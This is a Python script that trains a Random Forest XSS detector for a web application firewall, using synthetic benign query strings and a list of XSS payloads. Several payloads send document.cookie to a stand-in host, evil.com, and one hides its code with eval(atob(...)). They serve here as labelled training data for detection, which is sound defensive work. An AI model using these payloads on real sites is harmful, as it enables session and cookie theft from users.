"""Train a Random Forest classifier for XSS detection.

Generates synthetic training data, extracts features using
:class:`~waf.ai.feature_extractor.FeatureExtractor`, trains the model,
and saves it to the ``models/`` directory.
"""

import os
import sys

import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import accuracy_score, classification_report
from sklearn.model_selection import train_test_split

_PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

from waf.ai.feature_extractor import FeatureExtractor
from waf.core.request_parser import ParsedRequest

# ------------------------------------------------------------------
# Synthetic data generation
# ------------------------------------------------------------------

NORMAL_PAYLOADS = [
    "search=hello+world",
    "username=john&password=secret123",
    "page=2&sort=name&order=asc",
    "q=python+tutorial",
    "id=42",
    "category=books&limit=10",
    "name=Jane+Doe&email=jane@example.com",
    "action=view&item=12345",
    "lang=en&region=us",
    "filter=active&page=1",
    "q=best+restaurants+near+me",
    "product=widget&color=blue&size=large",
    "ref=homepage&utm_source=google",
    "file=report.pdf&download=true",
    "comment=Great+article+thanks+for+sharing",
    "search=machine+learning+basics",
    "user=admin&tab=settings",
    "start=2024-01-01&end=2024-12-31",
    "format=json&pretty=true",
    "token=abc123def456",
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    "javascript:alert(document.cookie)",
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(1)">',
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    '<div onmouseover="alert(1)">hover me</div>',
    "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
    "'-alert(1)-'",
    '<embed src="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    "<script>window.location='http://evil.com'</script>",
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
    '<a href="javascript:alert(1)">click</a>',
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
]


def _generate_dataset(
    normal_payloads: list[str],
    xss_payloads: list[str],
    multiplier: int = 5,
) -> tuple[list[dict], list[int]]:
    """Return ``(feature_dicts, labels)`` for training."""
    extractor = FeatureExtractor()
    features_list: list[dict] = []
    labels: list[int] = []

    rng = np.random.default_rng(42)

    for payload in normal_payloads * multiplier:
        parsed = ParsedRequest(
            method="GET",
            path="/page",
            query_params={"input": payload},
            headers={"User-Agent": "Mozilla/5.0"},
            body="",
            client_ip="127.0.0.1",
        )
        features = extractor.extract(parsed)
        features["payload_length"] += int(rng.integers(-2, 3))
        features_list.append(features)
        labels.append(0)

    for payload in xss_payloads * multiplier:
        parsed = ParsedRequest(
            method="GET",
            path="/page",
            query_params={"input": payload},
            headers={"User-Agent": "Mozilla/5.0"},
            body="",
            client_ip="127.0.0.1",
        )
        features = extractor.extract(parsed)
        features["payload_length"] += int(rng.integers(-2, 3))
        features_list.append(features)
        labels.append(1)

    return features_list, labels


def train() -> None:
    """Generate data, train a Random Forest, and save the model."""
    print("Generating synthetic XSS training data …")
    features_list, labels = _generate_dataset(NORMAL_PAYLOADS, XSS_PAYLOADS)

    feature_names = list(features_list[0].keys())
    X = np.array([[f[k] for k in feature_names] for f in features_list])
    y = np.array(labels)

    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y,
    )

    print(f"Training samples: {len(X_train)}  |  Test samples: {len(X_test)}")
    print("Training Random Forest …")

    clf = RandomForestClassifier(
        n_estimators=100,
        max_depth=10,
        random_state=42,
        n_jobs=-1,
    )
    clf.fit(X_train, y_train)

    y_pred = clf.predict(X_test)
    accuracy = accuracy_score(y_test, y_pred)
    print(f"\nAccuracy: {accuracy:.4f}")
    print("\nClassification Report:")
    print(classification_report(y_test, y_pred, target_names=["normal", "xss"]))

    # Save model
    import joblib

    model_dir = os.path.join(_PROJECT_ROOT, "models")
    os.makedirs(model_dir, exist_ok=True)
    model_path = os.path.join(model_dir, "xss_model.joblib")
    joblib.dump(clf, model_path)
    print(f"Model saved to {model_path}")


if __name__ == "__main__":
    train()
